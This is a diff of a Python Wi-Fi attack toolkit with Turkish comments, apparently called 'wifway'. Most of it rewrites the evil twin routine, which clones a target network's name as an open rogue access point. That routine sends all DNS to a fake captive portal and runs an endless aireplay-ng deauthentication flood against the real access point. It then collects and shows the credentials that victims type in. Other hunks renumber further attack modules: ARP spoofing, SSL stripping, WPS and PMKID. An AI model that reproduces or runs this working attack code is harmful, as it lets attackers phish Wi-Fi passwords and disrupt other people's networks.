@@ -808,7 +808,7 @@ def _handshake_capture(ap, clients):
             error("Hash dosyası oluşturulamadı. hcxtools veya cap2hccapx kurulu mu?")
 
 # ══════════════════════════════════════════════════════════════════════
-#  3. EVIL TWIN + CAPTIVE PORTAL  ← DÜZELTİLMİŞ
+#  3. CAPTIVE PORTAL HTML
 # ══════════════════════════════════════════════════════════════════════
 
 CAPTIVE_PORTAL_HTML = b"""<!DOCTYPE html>
@@ -880,6 +880,9 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(CAPTIVE_SUCCESS_HTML)
 
+# ══════════════════════════════════════════════════════════════════════
+#  4. EVIL TWIN  (DÜZELTİLMİŞ)
+# ══════════════════════════════════════════════════════════════════════
 
 def _evil_twin(ap):
     show_help("evil_twin")
@@ -890,16 +893,14 @@ def _evil_twin(ap):
     global _portal_essid, captured_credentials
     captured_credentials = []
 
-    essid        = ap["essid"]
-    channel      = ap["channel"].strip().split(",")[0].strip()
+    essid         = ap["essid"]
+    channel       = ap["channel"].strip().split(",")[0].strip()
     _portal_essid = essid
 
     captive     = safe_input("Captive Portal ekle? [bold](e/h)[/]").strip().lower()
     portal_port = 80
 
-    # ── ADIM 1: İki-kart kontrolü ─────────────────────────────────────
-    # wlan0mon aktifse → iki kart; deauth mümkün
-    # değilse → tek kart; wlan0 AP için kullanılır, deauth atlanır
+    # ── İki-kart kontrolü ────────────────────────────────────────────
     two_card_mode = subprocess.run(
         ["ip", "link", "show", MON_IFACE], capture_output=True
     ).returncode == 0
@@ -909,34 +910,54 @@ def _evil_twin(ap):
     else:
         warn(f"Tek kart modu: [cyan]{INTERFACE}[/] AP için kullanılacak — deauth ATLANACAK.")
         warn("İki kartlı kurulumda deauth da aktif olur.")
-        # Monitor modu açıksa kapat (wlan0 serbest kalsın)
-        if subprocess.run(["ip", "link", "show", MON_IFACE],
-                          capture_output=True).returncode == 0:
-            status("Monitor mod durduruluyor (wlan0 AP için gerekli)...")
-            subprocess.run(["sudo", "airmon-ng", "stop", MON_IFACE],
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            time.sleep(1.5)
 
-    # ── ADIM 2: wlan0 hazırla ─────────────────────────────────────────
-    subprocess.run(["sudo", "ip", "link",  "set",   INTERFACE, "down"],   capture_output=True)
-    subprocess.run(["sudo", "ip", "addr",  "flush", "dev", INTERFACE],    capture_output=True)
-    subprocess.run(["sudo", "ip", "link",  "set",   INTERFACE, "up"],     capture_output=True)
+    # ── Monitor modu kapat (wlan0 AP için serbest kalmalı) ───────────
+    if subprocess.run(["ip", "link", "show", MON_IFACE], capture_output=True).returncode == 0:
+        status("Monitor mod durduruluyor (wlan0 AP için gerekli)...")
+        subprocess.run(["sudo", "airmon-ng", "stop", MON_IFACE],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(2)
+
+    # ── wlan0'ı managed moda al ───────────────────────────────────────
+    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "down"],             capture_output=True)
+    subprocess.run(["sudo", "iw", "dev", INTERFACE, "set", "type", "managed"],  capture_output=True)
+    subprocess.run(["sudo", "rfkill", "unblock", "wifi"],                        capture_output=True)
+
+    # wlan0 tamamen hazır olana kadar bekle (max 10 sn)
+    status(f"[cyan]{INTERFACE}[/] arayüzü bekleniyor...")
+    deadline = time.time() + 10
+    while time.time() < deadline:
+        r = subprocess.run(["ip", "link", "show", INTERFACE], capture_output=True)
+        if r.returncode == 0:
+            break
+        time.sleep(0.5)
+    else:
+        error(f"{INTERFACE} arayüzü bulunamadı. Devam edilemiyor.")
+        subprocess.run(["sudo", "nmcli", "device", "set", INTERFACE, "managed", "yes"],
+                       capture_output=True)
+        return
+
+    # wlan0'ı ayağa kaldır
+    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "up"],   capture_output=True)
     time.sleep(0.5)
+
     # NetworkManager araya girmesin
     subprocess.run(["sudo", "nmcli", "device", "set", INTERFACE, "managed", "no"],
                    capture_output=True)
     time.sleep(0.3)
+
+    # IP ata
+    subprocess.run(["sudo", "ip", "addr", "flush", "dev", INTERFACE],            capture_output=True)
     subprocess.run(["sudo", "ip", "addr", "add", "192.168.66.1/24", "dev", INTERFACE],
                    capture_output=True)
-    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "up"],    capture_output=True)
-    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL)
+    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],            stdout=subprocess.DEVNULL)
     success(f"IP ayarlandı: [cyan]192.168.66.1[/] → {INTERFACE}")
 
-    # ── ADIM 3: eski dnsmasq proseslerini temizle ─────────────────────
+    # ── Eski dnsmasq proseslerini temizle ────────────────────────────
     subprocess.run(["sudo", "pkill", "-9", "-f", "dnsmasq"], capture_output=True)
     time.sleep(0.8)
 
-    # ── ADIM 4: hostapd.conf ─────────────────────────────────────────
+    # ── hostapd.conf ─────────────────────────────────────────────────
     hostapd_conf = "\n".join([
         f"interface={INTERFACE}",
         "driver=nl80211",
@@ -945,23 +966,23 @@ def _evil_twin(ap):
         f"channel={channel}",
         "macaddr_acl=0",
         "ignore_broadcast_ssid=0",
-        "auth_algs=1",   # Open auth
-        "wpa=0",         # Şifresiz — Evil Twin açık ağ olmalı
+        "auth_algs=1",
+        "wpa=0",          # Açık ağ — Evil Twin şifresiz olmalı
         "wmm_enabled=1",
         "beacon_int=100",
     ])
     conf_path = "/tmp/wifway_hostapd.conf"
     Path(conf_path).write_text(hostapd_conf)
 
-    # ── ADIM 5: dnsmasq.conf ─────────────────────────────────────────
+    # ── dnsmasq.conf ─────────────────────────────────────────────────
     dnsmasq_conf = "\n".join([
         f"interface={INTERFACE}",
         "bind-interfaces",
         "dhcp-range=192.168.66.10,192.168.66.50,255.255.255.0,10m",
-        "dhcp-option=3,192.168.66.1",   # Gateway
-        "dhcp-option=6,192.168.66.1",   # DNS
+        "dhcp-option=3,192.168.66.1",
+        "dhcp-option=6,192.168.66.1",
         "server=8.8.8.8",
-        "address=/#/192.168.66.1",      # Tüm DNS → captive portal
+        "address=/#/192.168.66.1",
         "no-resolv",
         "log-queries",
         "log-dhcp",
@@ -969,11 +990,10 @@ def _evil_twin(ap):
     dns_path = "/tmp/wifway_dnsmasq.conf"
     Path(dns_path).write_text(dnsmasq_conf)
 
-    # ── ADIM 6: iptables ─────────────────────────────────────────────
+    # ── iptables ─────────────────────────────────────────────────────
     subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
 
     if captive == "e":
-        # Port 80 müsait mi kontrol et
         try:
             _s = socket.socket(); _s.bind(("0.0.0.0", 80)); _s.close()
         except OSError:
@@ -992,22 +1012,9 @@ def _evil_twin(ap):
         ], capture_output=True)
         success(f"iptables: HTTP/HTTPS → port {portal_port} yönlendirildi.")
 
-    # ── ADIM 7: hostapd başlat (doğrudan subprocess — kontrollü) ─────
-   # wlan0 managed moda al (hostapd nl80211 için managed ister)
-    subprocess.run(["sudo", "airmon-ng", "stop", INTERFACE], capture_output=True)
-    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "down"], capture_output=True)
-    subprocess.run(["sudo", "iwconfig", INTERFACE, "mode", "managed"],  capture_output=True)
-    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "up"], capture_output=True)
-    subprocess.run(["sudo", "rfkill", "unblock", "wifi"], capture_output=True)
-    # IP'yi yeniden ata (mod değişince sıfırlanıyor)
-    subprocess.run(["sudo", "ip", "addr", "flush", "dev", INTERFACE], capture_output=True)
-    subprocess.run(["sudo", "ip", "addr", "add", "192.168.66.1/24", "dev", INTERFACE],
-                   capture_output=True)
-    time.sleep(1)
-
+    # ── hostapd başlat ───────────────────────────────────────────────
     status(f"hostapd başlatılıyor → SSID: [cyan]{essid}[/]  Kanal: [cyan]{channel}[/]")
 
-    # stderr'i de stdout'a yönlendir — boş hata mesajı sorununu çözer
     hostapd_proc = subprocess.Popen(
         ["sudo", "hostapd", "-dd", conf_path],
         stdout=subprocess.PIPE, stderr=subprocess.STDOUT
@@ -1019,19 +1026,22 @@ def _evil_twin(ap):
         line = hostapd_proc.stdout.readline().decode(errors="replace")
         if not line:
             break
-        # Debug çıktısını terminale yansıt (sorun tespiti için)
-        if any(kw in line for kw in ["ERROR", "error", "Failed", "failed", "Cannot", "reason"]):
+        if any(kw in line for kw in ["ERROR", "error", "Failed", "failed",
+                                      "Cannot", "No such device",
+                                      "driver initialization failed"]):
             warn(f"hostapd: {line.strip()}")
         if "AP-ENABLED" in line or "interface state ENABLED" in line:
             hostapd_ready = True
             break
         if hostapd_proc.poll() is not None:
-            # Kalan çıktıyı oku
             rest = hostapd_proc.stdout.read().decode(errors="replace")
             error(f"hostapd çöktü. Son çıktı:\n{(line + rest)[-800:]}")
             subprocess.run(["sudo", "ip", "addr", "flush", "dev", INTERFACE], capture_output=True)
             subprocess.run(["sudo", "nmcli", "device", "set", INTERFACE, "managed", "yes"],
                            capture_output=True)
+            if two_card_mode:
+                subprocess.run(["sudo", "airmon-ng", "start", INTERFACE],
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             return
         time.sleep(0.1)
 
@@ -1040,7 +1050,7 @@ def _evil_twin(ap):
     else:
         warn("hostapd hazır sinyali alınamadı, devam ediliyor...")
 
-    # ── ADIM 8: dnsmasq başlat ────────────────────────────────────────
+    # ── dnsmasq başlat ───────────────────────────────────────────────
     time.sleep(1)
     status("dnsmasq başlatılıyor...")
     dnsmasq_proc = subprocess.Popen(
@@ -1056,22 +1066,32 @@ def _evil_twin(ap):
         subprocess.run(["sudo", "ip", "addr", "flush", "dev", INTERFACE], capture_output=True)
         subprocess.run(["sudo", "nmcli", "device", "set", INTERFACE, "managed", "yes"],
                        capture_output=True)
+        if two_card_mode:
+            subprocess.run(["sudo", "airmon-ng", "start", INTERFACE],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         return
     success("dnsmasq aktif → DHCP + DNS hazır.")
 
-    # ── ADIM 9: Deauth (sadece iki kart modunda) ──────────────────────
+    # ── Deauth: sadece iki kart modunda wlan0mon ile ──────────────────
     deauth_proc = None
     if two_card_mode:
-        info("Orijinal AP deauth ile engelleniyor...")
-        deauth_proc = subprocess.Popen(
-            ["sudo", "aireplay-ng", "-0", "0", "-a", ap["bssid"], MON_IFACE],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-        )
-        success(f"Deauth aktif → [cyan]{ap['bssid']}[/]  ({MON_IFACE})")
+        status(f"Monitor mod yeniden açılıyor → [cyan]{MON_IFACE}[/]")
+        subprocess.run(["sudo", "airmon-ng", "start", INTERFACE],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(2)
+        if subprocess.run(["ip", "link", "show", MON_IFACE], capture_output=True).returncode == 0:
+            info("Orijinal AP deauth ile engelleniyor...")
+            deauth_proc = subprocess.Popen(
+                ["sudo", "aireplay-ng", "-0", "0", "-a", ap["bssid"], MON_IFACE],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            success(f"Deauth aktif → [cyan]{ap['bssid']}[/]  ({MON_IFACE})")
+        else:
+            warn(f"{MON_IFACE} açılamadı — deauth atlanıyor.")
     else:
         warn("Tek kart: deauth yok. İstemciler kendiliklerinden bağlanırsa captive portal çalışır.")
 
-    # ── ADIM 10: Captive Portal ───────────────────────────────────────
+    # ── Captive Portal ───────────────────────────────────────────────
     portal_server = None
     if captive == "e":
         try:
@@ -1092,7 +1112,7 @@ def _evil_twin(ap):
     st.add_row("Kanal",            channel)
     st.add_row("AP Interface",     INTERFACE)
     st.add_row("AP IP",            "192.168.66.1")
-    st.add_row("Deauth",           f"✔ {MON_IFACE}" if two_card_mode else "✘ (tek kart)")
+    st.add_row("Deauth",           f"✔ {MON_IFACE}" if deauth_proc else "✘")
     st.add_row("Captive Portal",   f"✔ port {portal_port}" if captive == "e" else "✘")
     console.print(st)
 
@@ -1122,20 +1142,25 @@ def _evil_twin(ap):
     try: dnsmasq_proc.terminate(); dnsmasq_proc.wait(timeout=3)
     except Exception: dnsmasq_proc.kill()
 
-    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"],              capture_output=True)
-    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"],   stdout=subprocess.DEVNULL)
-    subprocess.run(["sudo", "ip", "addr", "flush", "dev", INTERFACE],   capture_output=True)
+    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"],             capture_output=True)
+    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"],  stdout=subprocess.DEVNULL)
+    subprocess.run(["sudo", "ip", "addr", "flush", "dev", INTERFACE],  capture_output=True)
     subprocess.run(["sudo", "nmcli", "device", "set", INTERFACE, "managed", "yes"],
                    capture_output=True)
 
-    # Tek kart modunda monitor modu geri aç
-    if not two_card_mode:
-        info("Monitor mod yeniden etkinleştiriliyor...")
-        subprocess.run(["sudo", "airmon-ng", "start", INTERFACE],
+    # wlan0mon'u kapat (açıksa)
+    if subprocess.run(["ip", "link", "show", MON_IFACE], capture_output=True).returncode == 0:
+        subprocess.run(["sudo", "airmon-ng", "stop", MON_IFACE],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(1)
 
-    # Yakalanan şifreler
+    # Ana monitor modu yeniden aç
+    status("Monitor mod yeniden etkinleştiriliyor...")
+    subprocess.run(["sudo", "airmon-ng", "start", INTERFACE],
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(1.5)
+
+    # ── Yakalanan şifreler ────────────────────────────────────────────
     if captured_credentials:
         section("Yakalanan Kimlik Bilgileri")
         for c in captured_credentials:
@@ -1155,7 +1180,7 @@ def _evil_twin(ap):
     success("Evil Twin durduruldu, sistem temizlendi.")
 
 # ══════════════════════════════════════════════════════════════════════
-#  4. WPS
+#  5. WPS
 # ══════════════════════════════════════════════════════════════════════
 
 def _wps_attack(ap):
@@ -1172,7 +1197,7 @@ def _wps_attack(ap):
     log_event("wps", {"target": ap["bssid"], "mode": mode})
 
 # ══════════════════════════════════════════════════════════════════════
-#  5. BEACON FLOOD
+#  6. BEACON FLOOD
 # ══════════════════════════════════════════════════════════════════════
 
 BUILTIN_SSIDS = [
@@ -1214,7 +1239,7 @@ def _beacon_flood():
     log_event("beacon_flood", {"mode": mode})
 
 # ══════════════════════════════════════════════════════════════════════
-#  6. OS FİNGERPRİNTİNG
+#  7. OS FİNGERPRİNTİNG
 # ══════════════════════════════════════════════════════════════════════
 
 def _os_fingerprint(ap, clients):
@@ -1246,7 +1271,7 @@ def _os_fingerprint(ap, clients):
     log_event("os_fp", {"target": ip})
 
 # ══════════════════════════════════════════════════════════════════════
-#  7. PROBE REQUEST
+#  8. PROBE REQUEST
 # ══════════════════════════════════════════════════════════════════════
 
 def _probe_listener():
@@ -1258,7 +1283,7 @@ def _probe_listener():
     log_event("probe_listener", {})
 
 # ══════════════════════════════════════════════════════════════════════
-#  8. ARP SPOOF
+#  9. ARP SPOOF
 # ══════════════════════════════════════════════════════════════════════
 
 def _arp_spoof():
@@ -1277,7 +1302,7 @@ def _arp_spoof():
     send_notification(f"ARP Spoof aktif: {target} ↔ {gateway}")
 
 # ══════════════════════════════════════════════════════════════════════
-#  9. SSL STRIPPING
+#  10. SSL STRIPPING
 # ══════════════════════════════════════════════════════════════════════
 
 def _ssl_strip():
@@ -1303,7 +1328,7 @@ def _ssl_strip_cleanup():
     success("SSL Strip kuralları temizlendi.")
 
 # ══════════════════════════════════════════════════════════════════════
-#  10. CVE / ZAFİYET TARAMA
+#  11. CVE / ZAFİYET TARAMA
 # ══════════════════════════════════════════════════════════════════════
 
 def _cve_scan():
@@ -1333,7 +1358,7 @@ def _cve_scan():
     log_event("cve_scan", {"target": ip, "type": choice})
 
 # ══════════════════════════════════════════════════════════════════════
-#  11. BLUETOOTH TARAMA
+#  12. BLUETOOTH TARAMA
 # ══════════════════════════════════════════════════════════════════════
 
 def _bluetooth_scan():
@@ -1424,7 +1449,7 @@ def _bluetooth_scan():
         log_event("bt_l2ping", {"target": mac, "result": out})
 
 # ══════════════════════════════════════════════════════════════════════
-#  12. WPA ENTERPRISE
+#  13. WPA ENTERPRISE
 # ══════════════════════════════════════════════════════════════════════
 
 def _wpa_enterprise():
@@ -1457,7 +1482,7 @@ def _wpa_enterprise():
     log_event("wpa_enterprise", {"essid": essid})
 
 # ══════════════════════════════════════════════════════════════════════
-#  13. KANAL ATLAMA
+#  14. KANAL ATLAMA
 # ══════════════════════════════════════════════════════════════════════
 
 def _channel_hopping():
@@ -1466,7 +1491,7 @@ def _channel_hopping():
     run_command_in_xterm(cmd, "Channel Hopping", fg="cyan")
 
 # ══════════════════════════════════════════════════════════════════════
-#  14. WORDLIST ÜRETİCİ
+#  15. WORDLIST ÜRETİCİ
 # ══════════════════════════════════════════════════════════════════════
 
 def _wordlist_generator():
@@ -1512,7 +1537,7 @@ def _wordlist_generator():
     return str(out)
 
 # ══════════════════════════════════════════════════════════════════════
-#  15. PMKID
+#  16. PMKID
 # ══════════════════════════════════════════════════════════════════════
 
 def _pmkid_attack(ap):
@@ -1545,7 +1570,7 @@ def _pmkid_attack(ap):
         warn("Hash dosyası oluşturulamadı.")
 
 # ══════════════════════════════════════════════════════════════════════
-#  16. OTOMASYON
+#  17. OTOMASYON
 # ══════════════════════════════════════════════════════════════════════
 
 def _automation_mode():
